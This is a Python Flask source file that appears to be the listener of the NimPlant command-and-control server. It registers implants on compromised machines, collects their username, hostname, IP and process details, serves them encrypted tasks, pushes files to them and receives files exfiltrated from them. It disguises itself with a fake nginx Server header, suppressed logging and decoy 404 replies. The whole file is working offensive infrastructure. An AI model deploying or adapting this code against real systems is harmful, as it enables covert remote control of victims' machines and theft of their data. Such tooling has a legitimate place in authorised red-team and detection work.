import flask
import base64, gzip, hashlib, io, json, logging, sys
from .func import *
from .config import config
from .crypto import *
from .nimplant import *
from .notify import notify_user

# Parse configuration from 'config.toml'
try:
    listenerType    = config['listener']['type']
    listenerIp      = config['listener']['ip']
    listenerPort    = config['listener']['port']
    registerPath    = config['listener']['registerPath']
    taskPath        = config['listener']['taskPath']
    resultPath      = config['listener']['resultPath']
    userAgent       = config['nimplant']['userAgent']
    if listenerType == "HTTPS":
        sslCertPath = config['listener']['sslCertPath']
        sslKeyPath  = config['listener']['sslKeyPath']
except KeyError as e:
    nimplantPrint(f"ERROR: Could not load configuration, check your 'config.toml': {str(e)}")
    os._exit(1)


# Define custom Flask class to override Server header
class localFlask(flask.Flask):
    def process_response(self, response):
        response.headers['server'] = "nginx 1.18.0"
        return(response)

# Init flask app and surpress Flask logging and startup messages
app = localFlask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

# Define a function to notify users of unknown or erroneous requests
def notifyBadRequest(src, method, path, user_agent, reason="generic"):
    if reason == "badkey":
        nimplantPrint(f"Rejected malformed {method} request. This is likely caused by a XOR key mismatch between NimPlant and server! Request from '{src}': {path} ({user_agent}). ")
    else:
        nimplantPrint(f"Rejected {method} request from '{src}': {path} ({user_agent})")

# Define Flask listener to run in thread
def flaskListener(xor_key):
    @app.route(registerPath, methods=['GET', 'POST'])
    # Verify expected user-agent for incoming registrations
    def getNimPlant():
        if userAgent == flask.request.headers.get("User-Agent"):
            # First request from NimPlant (GET, no data) -> Initiate NimPlant and return XORed key
            if flask.request.method == 'GET':
                np = NimPlant()
                nps.add(np)
                xor_bytes = xorString(np.cryptKey, xor_key)
                encodedKey = base64.b64encode(xor_bytes).decode('utf-8')
                return flask.jsonify(id=np.guid, k=encodedKey), 200

            # Second request from NimPlant (POST, encrypted blob) -> Activate the NimPlant object based on encrypted data
            elif flask.request.method == 'POST':
                data = flask.request.json
                np = nps.getNimPlantByGuid(data["id"])
                data = data["data"]
                
                try:
                    data = decryptData(data, np.cryptKey)
                    dataJson = json.loads(data)
                    ipAddrInt = dataJson['i']
                    ipAddrExt = flask.request.remote_addr
                    username  = dataJson['u']
                    hostname  = dataJson['h']
                    osBuild   = dataJson['o']
                    pid       = dataJson['p']
                    riskyMode = dataJson['r']
                    
                    np.activate(ipAddrExt, ipAddrInt, username, hostname, osBuild, pid, riskyMode)

                    notify_user(np)

                    if not nps.containsActiveNimPlants():
                        nps.selectNimPlant(np.guid, np)
                    
                    return flask.jsonify(status="OK"), 200

                except:
                    notifyBadRequest(flask.request.remote_addr, flask.request.method, flask.request.path, flask.request.headers.get("User-Agent"), "badkey")
                    return flask.jsonify(status="Not found"), 404
        else:
            notifyBadRequest(flask.request.remote_addr, flask.request.method, flask.request.path, flask.request.headers.get("User-Agent"))
            return flask.jsonify(status="Not found"), 404

    @app.route(taskPath, methods=['GET'])
    # Return the active task IF the user-agent is as expected
    def getTask():
        np = nps.getNimPlantByGuid(flask.request.args.get("id"))
        if np is not None:
            if (userAgent == flask.request.headers.get("User-Agent")):
                # Update the external IP address if it changed
                if not np.ipAddrExt == flask.request.remote_addr:
                    np.ipAddrExt = flask.request.remote_addr

                task = np.getTask()
                if task is not None:
                    # There is a task - check in to update 'last seen' and let the server know that a command is received
                    np.checkIn()
                    task = encryptData(task, np.cryptKey)
                    np.resetTask()
                    return flask.jsonify(task=task), 200
                else:
                    # There is no task - check in to update 'last seen'
                    if np.isActive():
                        np.checkIn()
                    return flask.jsonify(status="OK"), 200
            else:
                notifyBadRequest(flask.request.remote_addr, flask.request.method, flask.request.path, flask.request.headers.get("User-Agent"))
                return flask.jsonify(status="Not found"), 404
        else:
            notifyBadRequest(flask.request.remote_addr, flask.request.method, flask.request.path, flask.request.headers.get("User-Agent"))
            return flask.jsonify(status="Not found"), 404

    @app.route(taskPath + '/<fileId>', methods=['GET'])
    # Return a hosted file as gzip-compressed stream for the 'upload' command, IF the user-agent is as expected AND the caller knows the file ID
    def uploadFile(fileId):
        np = nps.getNimPlantByGuid(flask.request.args.get("id"))
        if np is not None:
            if (userAgent == flask.request.headers.get("User-Agent")):
                if (np.hostingFile != None) and (fileId == hashlib.md5(np.hostingFile.encode('utf-8')).hexdigest()):
                    # Construct a GZIP stream of the uploaded file in-memory
                    try:
                        contents = open(np.hostingFile, mode='rb')
                        data = io.BytesIO()
                        zip = gzip.GzipFile(fileobj=data, mode='wb')
                        zip.writelines(contents)
                        zip.close()
                        contents.close()

                        # Tell the nimplant object to stop hosting this file
                        np.stopHostingFile()
                        res = flask.make_response(data.getvalue())
                        res.mimetype = 'application/x-gzip'
                        res.headers['Content-Encoding'] = 'gzip'
                        return res
                    except Exception as e:
                        nimplantPrint(f"An error occurred while uploading file: {e}", np.guid)
                        np.stopHostingFile()
                        return flask.jsonify(status="Not found"), 404
                else:
                    return flask.jsonify(status="OK"), 200
            else:
                notifyBadRequest(flask.request.remote_addr, flask.request.method, flask.request.path, flask.request.headers.get("User-Agent"))
                return flask.jsonify(status="Not found"), 404
        else:
            notifyBadRequest(flask.request.remote_addr, flask.request.method, flask.request.path, flask.request.headers.get("User-Agent"))
            return flask.jsonify(status="Not found"), 404

    @app.route(taskPath + '/u', methods=['POST'])
    # Receive a file downloaded from NimPlant through the 'download' command, IF the user-agent is as expected AND the NimPlant object is expecting a file
    def downloadFile():
        np = nps.getNimPlantByGuid(flask.request.args.get("id"))
        if np is not None:
            if (userAgent == flask.request.headers.get("User-Agent")):
                if np.receivingFile != None:
                    try:
                        uncompressed_file = decryptBinaryData(gzip.decompress(flask.request.data), np.cryptKey)
                        with open(np.receivingFile, "wb") as f:
                            f.write(uncompressed_file)
                        nimplantPrint(f"Successfully downloaded file to '{os.path.abspath(np.receivingFile)}'.", np.guid)
                        np.stopReceivingFile()
                        return flask.jsonify(status="OK"), 200
                    except Exception as e:
                        nimplantPrint(f"An error occurred while downloading file: {e}", np.guid)
                        np.stopReceivingFile()
                        return flask.jsonify(status="Not found"), 404
                else:
                    return flask.jsonify(status="OK"), 200
            else:
                notifyBadRequest(flask.request.remote_addr, flask.request.method, flask.request.path, flask.request.headers.get("User-Agent"))
                return flask.jsonify(status="Not found"), 404
        else:
            notifyBadRequest(flask.request.remote_addr, flask.request.method, flask.request.path, flask.request.headers.get("User-Agent"))
            return flask.jsonify(status="Not found"), 404

    @app.route(resultPath, methods=['POST'])
    # Parse command output IF the user-agent is as expected
    def getResult():
        data = flask.request.json
        np = nps.getNimPlantByGuid(data["id"])
        if np is not None:
            if (userAgent == flask.request.headers.get("User-Agent")):
                data = data["data"]
                data = decryptData(data, np.cryptKey)
                np.setResult(data)
                return flask.jsonify(status="OK"), 200
            else:
                notifyBadRequest(flask.request.remote_addr, flask.request.method, flask.request.path, flask.request.headers.get("User-Agent"))
                return flask.jsonify(status="Not found"), 404
        else:
            notifyBadRequest(flask.request.remote_addr, flask.request.method, flask.request.path, flask.request.headers.get("User-Agent"))
            return flask.jsonify(status="Not found"), 404

    @app.errorhandler(Exception)
    def all_exception_handler(error):
        notifyBadRequest(flask.request.remote_addr, flask.request.method, flask.request.path, flask.request.headers.get("User-Agent"))
        return flask.jsonify(status="Not found"), 404
    if listenerType == "HTTP":
        try:
            app.run(host=listenerIp, port=listenerPort)
        except Exception as e:
            nimplantPrint(f"ERROR: Error setting up web server. Verify listener settings in 'config.toml'. Exception: {e}")
            os._exit(1)
    else:
        try:
            app.run(host=listenerIp, port=listenerPort, ssl_context=(sslCertPath, sslKeyPath))
        except Exception as e:
            nimplantPrint(f"ERROR: Error setting up SSL web server. Verify 'sslCertPath', 'sslKeyPath', and listener settings in 'config.toml'. Exception: {e}")
            os._exit(1)